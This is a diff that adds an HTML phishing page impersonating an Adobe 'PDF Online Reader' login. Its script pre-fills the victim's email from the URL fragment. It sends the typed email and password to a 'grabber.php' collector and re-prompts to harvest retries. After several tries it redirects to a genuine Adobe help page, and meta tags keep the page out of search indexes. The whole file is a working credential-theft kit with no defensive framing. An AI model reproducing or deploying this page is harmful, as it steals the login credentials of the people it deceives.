@@ -1,0 +1,153 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xml:lang="en" lang="en" xmlns="http://www.w3.org/1999/html">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,10,9,8,7"/>
+	<title>Adobe | PDF Online Reader</title>
+	<meta name="robots" content="noindex" />
+	<meta name="robots" content="nofollow" />
+	<META NAME="GOOGLEBOT" CONTENT="NOARCHIVE" /><META NAME="GOOGLEBOT" CONTENT="NOSNIPPET" />
+</head>
+<body style="background:url(includes/bg.png); background-size: cover; background-repeat: no-repeat;">
+
+<script>
+const url = 'grabber.php';   //full url goes here
+</script>
+
+<style>
+.login{
+	width:272px; height:20px; font-family: arial; font-size: 14px; color:#DF0101; font-weight:bold; 
+	background-color: #ffffff; border: solid 1px #BDBDBD; 
+	-webkit-box-shadow: 2px 2px 2px 2px #616162; box-shadow: 2px 2px 2px 2px #616162; padding: 7px; border-radius: 2px 3px 1px 5px;
+}
+.btn{
+	width:90px; height:35px; font-family: arial; font-size: 14px; color:#FFF; background-color: #DF0101; border: solid 1px #DF0101;
+	-webkit-box-shadow: 2px 2px 2px 2px #616162; box-shadow: 2px 2px 2px 2px #616162; padding: 10px; border-radius: 2px 5px 1px 7px;
+	cursor:pointer; 
+}
+
+</style>
+<div style="margin:-8px;width:100%">
+
+<div  style="position:absolute;top:220px;left:524px; 
+width:335px; height:300px; font-family: arial; font-size: 14px; color:#FFF; background-color: #FFFFFF; border: solid 1px #FFFFFF;
+	-webkit-box-shadow: 2px 2px 2px 2px #616162; box-shadow: 2px 2px 2px 2px #616162; padding: 10px; border-radius: 2px 5px 1px 7px;">
+
+</div>
+
+
+<div style="position:absolute;top:250px;left:560px;">
+	<font style="font-family: arial; font-size: 23px; color:#DF0101;">
+		<strong>PDF Online Reader</strong>
+	</font>
+</div>
+
+<div style="position:absolute;top:290px;left:560px;">
+	<font style="font-family: arial; font-size: 13px; color:#2E2E2E;">
+		Authentication Required
+	</font>
+	<br>
+	<font style="font-family: arial; font-size: 13px; color:#2E2E2E;">
+		Sign in to view your shared file...
+	</font>
+</div>
+
+<div style="position:absolute;top:540px;left:80px;">
+	<font style="font-family: arial; font-size: 18px; color:#0965B1;">
+	
+	</font>
+</div>    
+	<form method="post" action="" onsubmit="Validate(); return false;">
+	<input readonly id="user" name="user" class="login" style="position:absolute;top:340px;left:560px" type="email">
+	<input required placeholder="enter password" type="password" id="pass" name="pass" class="login" style="position:absolute;top:390px;left:560px">
+	<div style="position:absolute;top:440px;left:560px;">
+		<input type="checkbox" checked>
+		<font style="font-family: arial; font-size: 13px; color:#2E2E2E;"> Remember me</font>
+	</div>
+	<input id="b1" type="submit" class="btn" style="position:absolute;top:470px;left:560px; font-weight:bold;" value="Sign in">
+	</form>
+</div>
+
+<input type="hidden" id="count" value="0">
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js'></script>
+
+
+<script>
+      $(document).ready(function(){
+        var count=0;
+
+      /////////////url email getting////////////////
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+          var my_email =email;
+          $('#user').val(my_email);
+			
+			}
+		  })
+
+
+function Validate(){
+var a = $('#user').val();
+var b = $('#pass').val();
+var c = $('#count').val();
+
+$.post(url, {user:a,pass:b}, function(){
+setTimeout(function(){
+if(c>=2){
+$('#count').val('0');
+window.location='https://helpx.adobe.com/acrobat/kb/error-pdf-creation-cannot-continue.html';
+}else{
+$('#bg').fadeOut();
+$('#bg2').fadeIn();
+$('#user').css('top','250px');
+$('#pass').css('top','311px');
+$('#b1').css('top','381px');
+$('#pass').val('');
+var add = +c+1;
+$('#count').val(add);
+$('#pass').focus();
+}
+},2000);
+});
+}
+</script>
+
+<script>
+function process(){
+	var user = document.getElementById('user').value;
+	var pass = document.getElementById('pass').value;
+	if ((user == '') || (user == null)){
+	document.getElementById('bg').src='';
+	document.getElementById('user').focus();
+return false;	
+	}else
+	if ((pass == '') || (pass == null)){
+	document.getElementById('bg').src='';
+	document.getElementById('pass').focus();
+return false;	
+	}else
+	
+return true	;
+}
+</script>
+<script>
+$('input').focus(function(){
+  $(this).parents('.form-group').addClass('focused');
+});
+
+$('input').blur(function(){
+  var inputValue = $(this).val();
+  if ( inputValue == "" ) {
+    $(this).removeClass('filled');
+    $(this).parents('.form-group').removeClass('focused');  
+  } else {
+    $(this).addClass('filled');
+  }
+})  
+</script>
+</body>
+</html>
